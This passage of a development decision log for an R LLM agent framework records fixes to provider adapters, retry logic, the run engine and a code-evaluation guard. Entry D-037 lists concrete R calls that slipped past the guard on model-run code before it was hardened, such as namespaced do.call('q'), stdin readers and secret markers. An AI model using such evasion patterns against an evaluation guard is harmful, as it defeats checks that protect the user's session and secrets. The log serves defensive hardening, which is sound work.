   (the plan's `err$code` threw, giving an `internal` error).
4. **Items found by `item_id`, then `output_index`; malformed items stay harmless.** Stream fields
   are read with `[[`. A delta that carries only `item_id` reaches its item (the plan's
   `as.character(NULL)` key threw), an item that is not an object is ignored, a message item
   without an id gets no signature (the plan wrote `{"v":1,"id":null}`), a done item without
   `phase` keeps the phase of the added item, a function call without an `fc_` id keeps its call
   id alone (the plan gave `call_z|`), and an empty summary or content list no longer blanks
   streamed text.

Validation: `progress/P12.md`, Task 6. The plan's six tests pass against the plan-literal source;
the eight added tests fail 18 assertions there (2 null usages read as zero, the failed usage lost,
the list code classified, the vector code throwing, the typeless SSE error, 2 for the bare-string
error, 3 statuses, 2 for the `item_id` delta, 3 for the non-object item, 1 for `call_z|`, and the
blanked thinking and text of empty done lists).

## D-032 - P12 Responses request bodies: compat and headers from the resolved record, tools only where the model calls tools, signatures read by exact field (2026-10-04)

P12 Task 7's plan-literal `responses_build()` and `responses_assistant()`
(`R/provider-openai-responses.R`, the `build()` of the `openai-responses` adapter) were changed in
three ways. P07's `request_build()`, P06's runs and P24 consume the bodies.

1. **Compat and headers from the provider record `provider_stream()` resolved** (D-023 items 1 and
   3 and D-027 item 3, which required this of Task 7). The plan's `compat_flags(model$provider,
   model)` and `c(headers, adp_provider_headers(model))` looked the provider up globally, so a
   session-scoped provider (`model = <spec>`, 04 section 10.1) lost its `compat` (the explicit
   cache mode: `prompt_cache_options` and the explicit breakpoints) and its headers, a session
   record shadowing `openai` could not switch the explicit mode off (plan ambiguity 13), and a
   record header with the name of an adapter header was sent twice, which P04's `http_headers()`
   refuses. Now `compat_flags(adp_provider_record(model, opts) %||% list(id = <provider>),
   model)` and `adp_merge_headers(..., auth = "authorization")`.
2. **Tools only for a model that calls tools; `tool_choice` only with a tools array**
   (07-local-ollama.md section 1, IC-74: tool calling is "enabled only when the selected model
   supports" it; D-029 items 1 and 2 for this adapter). A model record with `tool_call = FALSE`
   gets no `tools`, no `tool_choice` and no `additional_tools` item (operator text is still sent as
   a developer message, and the history's calls and results are still sent); a request without a
   tools array sends no `tool_choice` (a forced choice would name an undeclared tool). The plan
   sent all three whatever the model's tool calling and the tools. Reach as in D-029.1: the
   catalog's `openai` models all declare `tool_call = TRUE`; a user or plugin `gptr_provider()`
   model on this api must declare it.
3. **Text signatures are read by exact field.** The plan's `sig$id` partial-matched another key
   (`{"identifier":"msg_x"}` became a message item with id `msg_x`) and threw for a signature that
   parses to a JSON scalar, so `build()` failed for that session. `responses_text_signature()` takes
   the id and `phase` only when each is one string; otherwise the block replays as plain assistant
   text, and a phase that is not one string is left out.

Validation: `progress/P12.md`, Task 7. The plan's tests pass unchanged (the default cache-policy
and INFRA-25 run tests skip until P07, and P06 with P07, are loaded); against the plan-literal
source the three added tests fail 15 assertions (8 for the resolved record, 5 for tools and
`tool_choice`, 2 for the signature); mutations that append the record headers or send
`tool_choice` without tools fail 1 and 3 assertions. `gptr_check()` on the adapter: 31 checks, 0
failed.

## D-033 - P06 recovery classification: unknown or estimated usage proves no overflow, overflows and gptr's own failures are never retried, malformed records never throw (2026-10-04)

P06 Task 8's plan-literal `is_context_overflow()`, `run_retryable()`, `err_class()`,
`retryable_error_text()` and `agent_retry_delay()` (`R/agent-run.R`) were changed in four ways.
Task 10's run engine (`run_response()`, `run_response_error()`, `run_condition()`) consumes them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-021, D-022,
   D-024, D-025). The plan's silent-overflow rule added `usage$input %||% 0` and
   `usage$cache_read %||% 0`. An unknown count (P05's `usage_as(NULL)` for an unreported usage,
   D-022's `NA` for a reported null) made the sum `NA`, and the `if` then stopped with base R's
   unclassed "missing value where TRUE/FALSE needed" on every `stop` response of such a model; in
   Task 10's `run_response()` that error would end the run. The known prompt counts (`input`,
   `cache_read`) are now a lower bound: a field the usage leaves out keeps P05's legacy zero, and
   an unknown value (`NA`, or an explicit null such as a `json_decode()`d `"output": null`, the
   distinction P05's `usage_from_json()` makes; the plan's `%||% 0` read that null as zero) or one
   that is not a nonnegative number adds nothing. The rule therefore
   proves an overflow only when the known counts alone exceed the window (a `stop`) or reach 99%
   of it with a known zero output (a `length` stop); an unknown output never counts as zero. A
   usage marked `estimated = TRUE` (Task 10 replaces an unreported usage with gptr's own estimate
   before the check) proves nothing: Pi detects a silent overflow only from reported usage, and an
   estimate above the window would otherwise start a compaction on a guess.
2. **An overflow is never retried.** `run_retryable()` returns `FALSE` whenever
   `is_context_overflow(msg, NULL, err)` holds (Pi's `_isRetryableError()`; the plan's own
   interface line says "never an overflow"). The plan checked only the record's class, so a 429 or
   5xx whose text is an overflow ("429 too many tokens in the prompt") was retryable. Task 10's
   engine tests the overflow first, so its behaviour is unchanged; a direct caller now gets the
   same answer.
3. **gptr's own definitive failures are never retried.** P05's `provider_stream()` turns a gptr
   condition raised in its driver into an `error` event whose record carries the condition's
   class. For `no_key`, `not_available`, `untrusted`, `invalid_argument`, `invalid_spec` and
   `missing_package` the message is gptr's text, not a provider's, so the plan's fallback to the
   provider text patterns could retry a missing credential or an invalid argument twice (for
   example "`timeout` must be a number" matches `timeout`). These classes now give `FALSE`, like
   `auth` and `spend_cap`. `internal` keeps the text rule (P05's "The stream ended without a
   terminal event." is retried, as in report 02). `provider_classes()` is unchanged: such a
   failure is stored as `gptr_error_provider` with `error_type` naming the class (plan).
4. **The classifier never throws.** Fields are read with `[[` and checked for shape. A message that
   is not a list, an `error_message` that is not one string, a usage that is not a list, a count
   that is not one nonnegative number, a window that is not one positive finite number, an error
   record that is not a list, an `NA` or empty class and a status that is not one number give
   `FALSE`, `NA` or `"provider"`. The plan threw on several of them (`$` on an atomic vector,
   `'length = 2' in coercion to 'logical(1)'`, a character count) and returned the class `""`.
   `agent_retry_delay(attempt)` refuses an attempt that is not a whole number >= 1 with
   `gptr_error_invalid_argument` (as P04's `retry_backoff()`); the plan returned `numeric(0)`,
   `NA`, 2 or 4 for `0L`, `"1"`, `1.5` and `NULL`. Attempts of 3 and more still give 4 s.

Validation: `progress/P06.md`, Task 8 (`test-agent-run.R`). The plan's 18 tests pass against the
plan-literal source; the 7 added blocks fail 18 assertions there (the `if (NA)` error, 2
estimated usages, the non-list message, 2 retried overflows, 6 retried definitive classes and 6
accepted `agent_retry_delay()` arguments), and a probe of the plan-literal functions
(`dev/.validation/P06/task8-literal-probe.log`) shows the remaining throws of item 4.

## D-034 - P12 Gemini normaliser: IC-74 usage, typed finish reasons and error fields, malformed parts never end the stream (2026-10-04)

P12 Task 8's plan-literal `google_normaliser()` and `google_error_info()`
(`R/provider-google.R`, the `parse` of the `google-generative-ai` adapter) were changed in the four
ways below. Task 9 (the request builder and `builtin:google`), P06's usage rows and P24 consume
them.

1. **IC-74 usage** (07-local-ollama.md section 5: "Missing usage remains unknown"; D-022, D-027,
   D-031). The plan read `cachedContentTokenCount` and `thoughtsTokenCount` with `%||% 0`, so a
   reported null became a known zero. `google_usage()` now follows D-027's rule with Task 4's
   helpers (`completions_count()`, `completions_first()`): a field left out keeps P05's legacy
   zero, a reported null (or a value that is not a nonnegative number) is `NA`, and
   `"usageMetadata": null` is no report; each report still replaces the last (Pi). The
   hand-written goldens of `unknown_finish` and `truncated` (no usage on the wire) record unknown
   usage (`g_usage_unknown()`, as D-027 point 2 requires); the plan wrote zeros, which the D-022
   core no longer produces even with the plan-literal source.
2. **Contract-typed finish reasons** (04 section 4.2; D-022 point 3). A `finishReason` that is
   not one string is an `error` stop, never matched as text: the plan's `fr == "STOP"` mapped
   `["STOP"]` to `stop` and stored a numeric reason as an integer `raw_stop_reason`.
   `raw_stop_reason` is text (`adp_chr()`), the error message names it (`unknown` when it has no
   text) and appends `finishMessage` only when that is one string.
3. **Typed error fields; every error shape read** (09 section 2.1; D-031 point 3). An error chunk
   whose `error` is a bare string is a provider error with that text (the plan's `err$status`
   threw, giving an `internal` error), a `code` is used only when it is one whole number from 100
   to 599, an HTTP status (a vector code threw "'length = 2' in coercion to 'logical(1)'", and,
   found in review round 1, a code beyond R's integer range such as `1e10` escaped `push()` as
   the warning "NAs introduced by coercion to integer range", against 04 section 8.1's "Normalisers
   never signal R conditions"), and a `status` only when it is one string (the plan matched
   `list("UNAVAILABLE")` as a retryable overload).
4. **Malformed parts never end the stream.** Chunk fields are read with `[[` (no `$` partial
   matching). A part, `functionCall`, candidate or `content` that is not an object is ignored, and
   a text part counts only when `text` is one string (the plan threw "subscript out of bounds" or
   "$ operator is invalid for atomic vectors", ending the stream with an `internal` error, or
   joined a number into the text). A thought signature is kept only when it is one string (a
   non-string signature made the block constructors throw when the block closed). A call without
   a name gets a generated id with the prefix `call` (its block name is the core's
   `unknown_tool`), and a response id with no alphanumeric character gives the id fragment `x`.
   A generated id `<name>_<fragment>_<n>` moves on to the next free `n` when a call of the same
   message already holds it (review round 1: the plan could repeat a provider-supplied id such as
   `read_abc_2`, and duplicate ids in one assistant message break tool-result pairing).

Validation: `progress/P12.md`, Task 8. The plan's six tests pass against the plan-literal source
(56 assertions, the plan's count, with the adapted goldens); the four added tests for these
points fail 13 assertions there (2 null usages read as zero, 4 for the numeric and list finish
reasons, 2 for the non-string signature, 1 error for the bare-string `google_error_info()` call,
4 for the non-object parts), and an ad hoc probe of the plan-literal source
(`dev/.validation/P12/task8-adapt-red2.log`) shows the remaining throws of point 3. Review round 1
added the HTTP-range code rule of point 3 and the free-id rule of point 4, each with a regression
test that failed before the fix (`task8-fix1-red.log`: 8 failures and 1 warning).

## D-035 - P12 Gemini request bodies: headers from the resolved record, tools only where the model calls tools, image notes in the tool output (2026-10-04)

P12 Task 9's plan-literal `google_build()` and `google_tool_results()` (`R/provider-google.R`, the
`build()` of the `google-generative-ai` adapter registered by `builtin:google`) were changed in
three ways. P07's `request_build()`, P06's runs and P24 consume the bodies.

1. **Provider headers from the record `provider_stream()` resolved, merged by name** (D-023 items 1
   and 3, which required this of Task 9 with the credential header `x-goog-api-key`). The plan's
   `c(headers, adp_provider_headers(model))` looked the provider up globally, so a session-scoped
   provider (`model = <spec>`, 04 section 10.1) lost its non-secret headers (04 section 10.2 row 1),
   and a record header with the name of an adapter header (`Content-Type`, `X-Goog-Api-Key`) was
   sent twice, which P04's `http_headers()` refuses, so the request never left the process. Now
   `adp_merge_headers(headers, adp_provider_headers(model, opts), auth = "x-goog-api-key")`: the
   adapter's headers and key win, and a record's own key header is sent only when the adapter
   sends none.
2. **Tools only for a model that calls tools** (07-local-ollama.md section 1, IC-74: tool calling
   is "enabled only when the selected model supports" it; D-029.1 and D-032.2 for this adapter). A
   model record with `tool_call = FALSE` gets no `tools` and no `toolConfig`; the history's
   `functionCall` and `functionResponse` parts are still sent. The plan sent both whatever the
   model's tool calling (it already sent `toolConfig` only with a tools array). Reach as in
   D-029.1: the catalog's `google` model (`gemini-3.8-flash`) declares `tool_call = TRUE`; a user
   or plugin `gptr_provider()` model on this api must declare it.
3. **Tool-result images for a model without image input** (D-023 item 4 and D-029.3 for this
   adapter). Each image becomes the omission note "(image omitted: this model does not accept
   images)" in the result's own `functionResponse.response` text, after the text, once per image;
   no image content follows. The plan sent, on Gemini 3 and 2.5 alike, an extra user content
   "Tool result image:" followed only by the note (announcing an image that is not attached), and
   an empty `output` for an image-only result. With image input the plan's behaviour is unchanged
   (`functionResponse.parts` on Gemini 3, the following "Tool result image:" content on 2.5).

Validation: `progress/P12.md`, Task 9. The plan's ten tests pass against the plan-literal source
(the default cache-policy test skips until P07 registers the `default` policy); against the
plan-literal source the added tests fail 13 assertions (3 for the resolved record, 2 for tools
sent to a model without tool calling, 8 for the image notes); mutations of the final source that
append the record headers with `c()` or drop the `tool_call` gate fail 3 and 2 assertions.
`gptr_check()` on the adapter: 30 checks, 0 failed.

## D-036 - P06 request shaping: unusable router answers fall back, switches are counted per branch, no chat on decision models, colon model ids, IC-74 context estimates (2026-10-04)

P06 Task 9's plan-literal request shaping in `R/agent-run.R` (`run_target()`, `run_route()`,
`run_model_resolve()`, `freeze_fallback()`, `images_elide()`, `context_tokens()`,
`run_estimator_update()`, `plugin_state_persist()`, `run_returns()`, `run_build()`,
`request_fallback()`) was changed in the eight ways below. Task 10's run engine
(`run_request()`, `run_compact_check()`, `run_response()`, `run_settle()`) and Task 15's
`ctx$set_model()` consume these functions.

1. **An unusable router answer falls back** (IC-69: P06 calls the router "falling back to the
   default model with a diagnostic"; 04 section 10.2, kind table row 4 `router`: "a timeout, an
   error or a non-registered result falls back to the default model with a diagnostic and a
   `route` event"; IC-74). Item 2 says when the `route` event is emitted. The plan fell back only
   when the `router.call` service threw. An answer that named a model that does not resolve ended
   the run with `gptr_error_unknown_model`. An answer without a model string (`list(model = 42)`)
   ended it with `gptr_error_invalid_argument` from `model_resolve()`. A decision-only
   (classifier) model was accepted and reached `provider_stream()`, which refuses it (D-017), and
   that ended the run. Now `route_answer()` treats all three as unusable. Each one gets a
   `router_fallback` diagnostic and the default chat model (`model_default("chat")`). A default
   that is itself decision-only is refused with `gptr_error_not_available` before anything is
   appended. The fallback keeps the router's last state, from the branch's last `gptr.router`
   entry, as P08's `router_fallback()` does. A router state that is not JSON is dropped with a
   `router_state` diagnostic. Under the plan, `session_append()` failed with "the session store
   failed" and the run ended.
2. **A switch is counted against the branch, not the run** (IC-69 "each switch appends
   `model_change` ... and emits `route`"). The plan compared against `run$routed`, which is `NULL`
   at the start of every run. So every new run on a routed session appended `model_change` and
   `gptr.router` and emitted `route` again, even when the router chose the same model. That is a
   spurious switch and a stated cache miss. The baseline is now the model of the branch's last
   `model_change` entry (`path_model_ref()`), so a switch is recorded only when the model changes.
   P08's `router_call()` reads the branch's last `gptr.router` entry the same way.
   - Fallbacks follow the same rule. A fallback that changes the branch's model is a switch: it
     appends `model_change` and `gptr.router` and emits `route`. A repeated fallback to the same
     default gets its `router_fallback` diagnostic but no `route`. This differs from the literal
     words of 04 section 10.2 row 4 ("with a diagnostic and a `route` event"). IC-69 (section 15,
     which wins over section 10.2) ties `route` to a switch: "Each switch appends `model_change`
     ... and emits `route`". P08's `router_fallback()` follows IC-69 as well: it hands the fallback
     to P06 as an ordinary answer and leaves "the `route` event and the
     `model_change`/`gptr.router` entries of the switch" to `run_route()`. Once P08 is loaded, P06
     cannot tell P08's fallbacks from router choices, so a `route` per fallback could be emitted
     only for the fallbacks P06 detects itself. The plan also emitted no `route` for a repeated
     fallback within a run (`run$routed`); this change extends that to later runs.
3. **No chat request on a decision-only model** (IC-74; the coordinator's note; D-017, D-028).
   `run_target()` calls P05's `stream_chat_model()` on the resolved session model before any
   request is built. The plan returned the classifier record, and the refusal came only inside
   `provider_stream()`, after the budget check, the ledger row and `before_request`. The condition
   is the same (`gptr_error_not_available`). Router answers follow item 1.
4. **Model ids may hold a colon** (IC-74: local Ollama tags such as `qwen3:8b`). For a
   session-registered provider (`model = <spec:provider>`, ambiguity 21), the plan stripped any
   `:<suffix>` as a thinking level. So `loc/qwen3:8b` looked for model `qwen3` and failed, and
   `loc/m1:8b` silently resolved to `m1`. `run_model_resolve()` now tries the whole id first. It
   reads a suffix as thinking only when the suffix is one of P05's `catalog_thinking_levels`, which
   is P05's own `model_lookup()` rule. Otherwise the strict `gptr_error_unknown_model` applies.
5. **Thinking levels are clamped** to the model's levels with P05's `model_clamp_thinking()`. This
   applies to a router's `thinking`, a pending `ctx$set_model()` switch and the session's level.
   The plan passed any string through, for example `max` to a model whose highest level is `high`.
6. **The fallback freeze is a freeze** (04 section 9.1: `parameters` "a function is evaluated once
   at freeze"; `available` "evaluated at session freeze; `FALSE` excludes a direct tool"). The plan
   wrote `{}` as the schema of a tool whose `parameters` is a function. Task 7's `tool_frozen()`
   then validated against `{}`. The plan also ignored `available()`. `freeze_tool_decl()` now
   evaluates both with the session's ctx. A tool whose `available()` is not `TRUE` is left out. A
   tool whose `available()` or `parameters()` throws, or whose schema is not an object schema, is
   left out with a `tool_left_out` diagnostic.
7. **Images are elided by id** (IC-67: newly elided images are "recorded by an appended
   `gptr.image_elision` entry (one stated cache break)"). The plan elided one image block at a time.
   When one copy of a repeated image was enough to get under the limit, the next request elided
   every copy, because elision is keyed on the id. That changed the projection with no new entry,
   which is an unstated cache break. Now every copy of an elided id goes at once.
8. **IC-74 context estimates** (07-local-ollama.md section 5 "Missing usage remains unknown"; 03
   section 12.5 "the last provider-reported input total + output + `m * est(new entries)`"). The
   plan took any non-`NULL` `usage$total` as the anchor. An unknown total (`NA`, from
   `usage_as(NULL)` or a reported null) made `context_tokens()` `NA`, which Task 10's
   `compact.should` call and its S25 check (`is.finite()`) cannot take. gptr's own estimate
   (`estimated = TRUE`, Task 10's stand-in for an unreported usage) was taken as if the provider had
   reported it. Now only a finite provider-reported total is an anchor; without one, the estimate
   covers everything.
   - After a compaction the plan counted only the compaction's blocks and what followed. It
     dropped the kept tail, which P05's `entry_compaction_cut()` projects (S33), and the frozen
     prompt. Both are counted now.
   - Estimates count text, context and thinking blocks as prose, tool-call arguments as JSON and
     images with `est_image_tokens()` at the block's size, else at `gptr$plot()`'s 1000 x 700
     default (`msg_tokens_est()`). The plan's `msg_text()` dropped context blocks, tool calls and
     images. `request_fallback()` uses the same estimate.
   - An image elided on the path (IC-67) counts as its `[image omitted: ...]` text, which is what
     the request sends. `request_fallback()` therefore elides before it estimates (the plan
     estimated first and elided afterwards in `run_build()`), and `context_tokens()` passes the
     path's elided ids to the estimate. Otherwise every elided image would have been counted at
     full size in `tokens_est`, the ledger row, `before_request`, the estimator multiplier and the
     context projection.
   - `run_estimator_update()` also changed. The plan summed the prompt counts with `unlist()`,
     and an unknown count stopped it with base R's unclassed "missing value where TRUE/FALSE
     needed". An unknown count now leaves the multiplier unchanged; a count the usage leaves out is
     P05's legacy zero.

Two smaller changes:

- `plugin_state_persist()` persists a state emptied after it was persisted as `{}`. Under the plan
  nothing was written, so a resume restored the old state.
- `run_returns()` reports a `returns` schema that `schema_validate()` cannot apply as the same
  notice. The plan threw from settlement.

Validation: `progress/P06.md`, Task 9 (`test-agent-run.R`). The plan's 15 tests pass against the
plan-literal source. All 11 added blocks fail there, with 23 failed expectations
(`dev/.validation/P06/task9-literal-final.log`). The router fallback block stops at its third
answer, so a probe of the plan-literal `run_route()` (`task9-literal-probe.log`) shows the rest:
a classifier answer is accepted, `list(model = 42)` raises `gptr_error_invalid_argument`, and a
non-JSON state raises `gptr_error_internal` ("the session store failed").

## D-037 - P09 static guard: namespaced indirect calls, function arguments, stdin readers and every secret marker are checked, parseable code never makes the guard throw (2026-10-04)

P09 Task 1's plan-literal `eval_guard()`, `eval_assign_targets()` and `gptr_shim()`
(`R/eval-guard.R`) were changed in the five ways below. Task 8's `eval_run()` calls all three
without a handler, and P18's server `r` also uses the guard. Points 3-5 and the later items of
point 2 came from the first review round.

1. **Namespaced heads are checked like bare ones** (IC-67: `q`/`quit` "in any position (as a value,
   a `FUN` argument, inside `match.fun`, `get`, `do.call`, `base::`)"; 04 section 7.9 stdin
   readers). The plan set the call name only for a symbol head, so the indirect-string and stdin
   checks never saw a `pkg::fun(...)` call. `base::do.call("q", list())`,
   `base::match.fun("quit")()`, `base::get("q")()`, `base::readLines("stdin")` and
   `base::scan()` passed the guard and would end or hang the user's session. `pkg::name` is still
   always refused, and the name now also drives those checks. As a side effect
   `base::quote(q())` is no longer flagged, the same as the bare `quote(q())` the plan already
   exempts.
2. **No parseable input makes the guard or the targets throw** (04 section 2.2 and 7.9: evaluation
   failures never throw, they become events and a status). The plan's walkers indexed `e[[2L]]`
   and `e[[3L]]` without a length check, and `scan()`'s file argument without a missing check.
   `` `=`() ``, `` `for`() ``, `` `function`(x) ``, `` `$`() `` and `scan(, what = "a")` raised
   "subscript out of bounds" or 'argument "file_arg" is missing'.
   - An empty file argument now means scan()'s default `""`, which is standard input, so
     `scan(, what = "a")` is refused as a stdin read.
   - A `function` head counts as a definition only with a pairlist of formals and a body.
   - `eval_guard_target_root()` returns `NULL` for an empty argument, so `setkey(, id)` and
     `f(, 1)[1] = 2` no longer add a `""` target.
   - An assignment with an empty right-hand side (`` `=`(x, ) ``) defines nothing; the plan's
     `eval_guard_fun_defs()` raised 'argument "rhs" is missing'.
   - `assign()`, `for` and target roots never yield an `NA` or `""` name
     (`setkey(NA_character_, id)` gave `NA`).
   - `gptr_shim()` rewrites only top-level calls. The plan assigned every rewritten element back,
     and assigning a top-level `NULL` deletes it: `x = 1; NULL` lost an expression (its `srcref`
     no longer lined up), and `NULL; gptr("a")` raised "subscript out of bounds".
3. **Every literal secret marker is refused** (04 section 7.9 and 03 section 6.5: "a literal
   `[secret:` marker"). The plan matched only `[secret:[A-Za-z0-9_.-]+]`, but the vault's own
   names include `auth:<key>` and `auth:<key>:<field>` (`auth_secret_name()`), and
   `secret_name_ok()` allows `/`, `@` and `+`. So `[secret:auth:openai]` passed. The guard now
   uses the redactor's marker grammar (`R/auth-redact.R`). A `[secret:` that opens no complete
   marker is refused as `"[secret:"` with a plain `Sys.getenv()` hint, as `secret_scan()` does.
   Strings that are not valid UTF-8 are matched bytewise, without a warning.
4. **Stdin readers are found by argument, as R matches it.** The plan looked only at the first
   argument, and only of `readLines`, `readline`, `file`, `scan`, `source`, `read.table` and
   `read.csv`. The guard now resolves the connection argument with `match.call()` against the
   base or utils definition, so names, partial names and positions all count. It never evaluates
   anything. `readLines()` without a connection reads `stdin()`, as does its default. `parse()`
   joins `scan()`: with no `text`, the file `""` (the default) is the console. `readBin`,
   `readChar`, `read.csv2`, `read.delim` and `read.delim2` are added for `"stdin"`. A call that
   passes `...`, or that R would refuse (unused or ambiguous names), is not flagged.
   `readline` is no longer counted as a reader, since its argument is a prompt; it stays blocked
   as a call.
5. **`q`/`quit` as the function argument, and quoted names after `::`** (IC-67: "a `FUN`
   argument", "`base::`"). `match.fun()` looks a non-function value up by name, so
   `q = 1; sapply("no", q)` calls `base::q()`. The plan exempted it because the code assigns `q`.
   As the function argument (`what`, `FUN` or `f`, resolved by `match.call()`) of `do.call`,
   `match.fun`, the apply family, `Map`, `Reduce`, `Filter`, `Find` and `Position`, `q`/`quit` is
   now exempt only when the code defines a function of that name. Other arguments keep the value
   rule, so `q = quantile(x); sapply(q, round)` passes. R also accepts `base::"q"`, which the
   plan's symbol-only `::` check missed; a length-1 string name now counts like a symbol.

Known limit, unchanged: the walkers recurse once per nesting level. A 2,000-term `x + x + ...`
hits R's node stack in the walk even though R can evaluate it (measured with the sourced file:
1,000 terms pass, 2,000 overflow). That is an error before anything is evaluated, so it fails
closed.

Validation: `progress/P09.md`, Task 1 (`test-eval-guard.R`). The plan's 52 expectations pass
unchanged. The first two added blocks fail against the plan-literal source: 4 failures, then an
error at `scan(, what = 'a')` (`dev/.validation/P09/task1-red-adaptations.log`). A probe of the
plan-literal source gets 9 errors on odd calls; the adapted source gets 0
(`task1-probe-plan-literal.log`, `task1-probe-adapted.log`). Review round 1: the new
expectations failed before the fixes, `[ FAIL 19 | WARN 0 | SKIP 0 | PASS 78 ]`, then
`[ FAIL 2 | WARN 0 | SKIP 0 | PASS 120 ]` for the shim and `NA` cases
(`task1-fix1-red.log`, `task1-fix1-red2.log`). Green is 126. A fuzz of 70,000 parseable inputs
(two seeds) gives 0 errors and 0 warnings from the guard, the targets and the shim
(`task1-fix1-fuzz.log`, script `task1-fix1-fuzz.R`).

## D-038 - P06 run engine: a reported usage keeps its unknowns, nested pumps run only the awaited runs' tools, a failed stream redactor never ends the run, settlement survives a store failure (2026-10-04)

P06 Task 10's literal engine (`R/agent-run.R`) predates IC-74, departs from IC-57 and D-010, and
could leave a session `running` (04 section 7.6: `session_run()` runs to settlement). Six places
changed. The behaviours now, which P07 (compaction), P08 (`gateway_signal()`), P13, P14, P19
and P21 consume:

1. **The estimator fills a usage only when the provider reported nothing** (07-local-ollama.md
   section 5, "Missing usage remains unknown"; contract 4.3 `estimated`). The plan replaced the
   message's usage with `usage_new(input = <request estimate>, output = <text estimate>,
   estimated = TRUE)` whenever `input + output` was not a known positive number. A usage with a
   reported input and an unknown output, or a reported cache read beside zero input and output,
   therefore lost its observation. `run_usage_reported()` now decides. The estimator fills the row
   only when the record is missing, is refused by P05's `usage_as()`, or holds no known positive
   count among `input`, `output`, `cache_read`, `cache_write_5m` and `cache_write_1h`. That covers
   an all-unknown record (P05's `usage_as(NULL)`, which P12's normalisers give for a stream that
   reported nothing) and one with only legacy zeros. A partial report is kept as reported: its
   unknown counts stay `NA` in the stored message, the usage row and the session totals (D-021),
   and budgets compare its known part (D-025). The ledger's cache flags read the cache read of
   the normalised record (`usage_as()`): an omitted field is P05's legacy zero, an unknown one
   `NA` (D-024 item 2).
2. **An overflow condition's `tokens` is the provider's count.** `gptr_error_context_overflow`
   carried `msg$usage$input`. For an overflow without reported usage (the usual case: the error
   arrives before any usage) that was gptr's own estimate presented as a measurement. It is now
   the provider-reported input count, else `NA` (`run_overflow_tokens()`).
3. **A nested pump runs only the FIFO tools of the runs it awaits** (IC-57; P04's
   `reactor_pump()` default). The plan's `run_wait()` and foreground wait passed
   `allow_runs = NULL` (every run) whenever `run_current()` was `NULL`. That includes a pump nested
   in a hook or another reactor callback while another run is between steps: such a pump ran that
   other run's queued tool inside the hook, one pump level deeper. The choice is now by pump
   depth: every run only in the outermost pump (`reactor_depth() == 0`), else the awaited runs.
   Inside a tool this equals the plan's behaviour.
4. **A stream redactor that failed closed does not end the run** (D-010). A redactor that
   exceeded its hold-back limit keeps failing. The plan's `run_flush_deltas()` let its `flush()`
   error escape `run_response()`, which settled a complete response with status `error`
   (`gptr_error_internal`). Its held text is now dropped with a registry diagnostic, never
   emitted, and the response is recorded as usual.
5. **Settlement finishes when the store fails** (04 section 7.6, `session_run()` "runs `s` to
   settlement"; rule R2; the plan's own "the session never stays `running`"). The plan's
   `run_settle()` set `run$settled` first and then wrote to the store (`run_returns()`'s value
   entry, `plugin_state_persist()`) before it set the session's status, cleared the live run,
   released the reactor's hold and the frame bindings and emitted `agent_end`. A store failure
   (`gptr_error_internal`, "the session store failed") escaped, and `run_fail()` returned at once
   because the run was already settled: the session stayed `running` for good, every later
   `run_start()` raised `gptr_error_busy`, and no condition reached the caller.
   `run_settle_persist()` now runs those steps (and the last-text update) under one handler. A run
   with no terminal condition of its own (`idle`) settles with status `error` and the store's
   condition (a non-gptr error becomes `gptr_error_internal`, as in `run_fail()`); a run that
   ends `aborted` or already holds a condition (`error`, `max_turns`, `budget`, `blocked`) keeps
   it, and the store failure is a registry diagnostic (event `settle`). `run_abort()` guards its
   partial-answer append the same way (diagnostic, event `abort`), so under the abort-only policy
   the interrupt, not a store error, is re-signalled.
6. **An abort before the stream's `start` event records the run's model.** P01's accumulator
   answers `"unknown"` for api, provider and model until `start`, and never throws, so the plan's
   fallback to the run's model never ran. `run_partial_message()` uses the accumulator only once
   `start` was seen (`run$status == "streaming"`), else an empty message of `run$model` with the
   request id and route, as P05's `stream_partial()` does.

Unchanged: the estimator fill itself (contract 4.3; D-024 item 2, D-025 item 2, D-033 item 1 and
D-036 item 8 rely on it), and `provider_stream()`'s IC-74 refusals (a decision-only model, a
refused request preflight, which reads the run's frozen safety snapshot, a missing key), which end
the run with status `error` before any request, through `run_fail()`.

Validation: `progress/P06.md`, Task 10 (`test-agent-run.R`; the added blocks failed 9 assertions
against the plan-literal engine: 5 for item 1, 1 for item 2, 1 for item 3 (a tool run at pump
depth 2), 2 for item 4), and its review round 1 (items 5 and 6: 5 blocks that failed 21
assertions before the fix).

## D-039 - P10 r-call marker: ns_r_call() never forces or calls a gptr_r_call binding (2026-10-04)

P10 Task 1's plan-literal `ns_r_call()` (`R/tool-namespace.R`) walks `sys.frame(k)` outwards
with `exists()` + `get()`. `get()` forces a promise and calls an active binding. So a user
frame on the stack with a lazy argument or an active binding named `gptr_r_call` had it forced or
called from inside a `gptr$` member. For example, model code
`f = function(gptr_r_call) gptr$read("x"); f(stop("boom"))` raised `boom` from the member. That
contradicts the plan's own docstring ("no promise is forced", plan line 268) and architecture
section 6.4 R3, which never forces a user promise from a frame walk.

The walker now checks a binding only when it exists and `rlang::env_binding_are_lazy()` and
`rlang::env_binding_are_active()` are both `FALSE`. Both are sanctioned rlang uses
(architecture section 9.1), and rlang is already in Imports. A promise that was already forced
is no longer lazy, so it is still read. The `r` tool binds the marker as an ordinary local value
(P10 Task 11, plan line 7180), so no real marker is ever skipped. No contract or interface
changes; `ns_r_call()` still returns the innermost marker or `NULL`.

Validation: `progress/P10.md`, Task 1 (`test-tool-namespace.R`). One block was added, "a lazy or
active binding called gptr_r_call is neither forced nor called" (3 expectations). Against the
plan-literal walker, a scratch reproduction forced the promise and called the active binding
(`dev/.validation/P10/task1-red-lazy-binding.log`). Green is `[ FAIL 0 | WARN 0 | SKIP 0 |
PASS 31 ]`: the plan's 28 expectations, unchanged, plus these 3.

## D-040 - P09 workspace snapshot: missing arguments are listed, not fatal; display text is valid UTF-8; linear on large workspaces (2026-10-04)

P09 Task 2's plan-literal `env_snapshot()`, `workspace_lines()`, `changes_lines()` and
`env_fmt_n()` (`R/env-snapshot.R`) were changed in the four ways below. Each was found by a probe
of the plan-literal source (`dev/.validation/P09/task2-probe-plan-literal.log`). The contract's
columns, kinds and line grammar are unchanged.

1. **A binding holding R's missing argument is a row, not an error** (04 section 2.2: evaluation
   failures never throw; 04 section 7.9: the snapshot never forces anything). A function-frame
   home has one when a formal without a default was not supplied, or when `...` is empty. The
   plan's `get()` and its fallback `get()` both threw 'argument "x" is missing, with no
   default', so any `r` call in such a home would fail. A failing `get()` also leaves the home on
   its unwound frame. A fresh-process control gives one copy of the user's object on the next
   edit, bare or inside `tryCatch()` through the box (`task2-copy-negative-control.log`).
   `env_snap_missing()` now checks first, with `identical(.subset2(envir, name), quote(expr = ))`.
